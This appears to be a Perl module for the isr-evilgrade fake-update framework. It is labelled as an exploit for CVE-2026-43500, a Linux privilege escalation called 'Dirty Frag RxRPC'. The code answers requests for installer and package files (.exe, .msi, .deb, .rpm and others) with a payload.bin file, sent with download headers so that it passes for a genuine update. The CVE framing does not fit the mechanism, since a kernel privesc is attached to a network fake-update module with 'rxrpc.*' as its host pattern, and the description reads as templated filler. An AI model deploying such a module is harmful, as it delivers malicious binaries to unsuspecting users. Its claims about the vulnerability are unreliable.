###############
# linux_dirty_frag_rxrpc.pm
#
# CVE-2026-43500: PrivEsc Vulnerability
# Type: PrivEsc
# CVSS: 7.8
# Year: 2026
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::linux_dirty_frag_rxrpc;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'linux_dirty_frag_rxrpc',
    'version'     => '1.0',
    'cvss'        => '7.8',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2026-43500: PrivEsc vulnerability.
CVSS Score: 7.8
Vector: PrivEsc
Year Disclosed: 2026
Payload: Dirty Frag RxRPC
    },
    'vh' => 'rxrpc.*',
    'request' => [
        {
            'req'   => '/.*\\.exe|\\.msi|\\.pkg|\\.deb|\\.rpm',
            'type'  => 'file',
            'file'  => './include/linux_dirty_frag_rxrpc/payload.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=Dirty Frag RxRPC\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
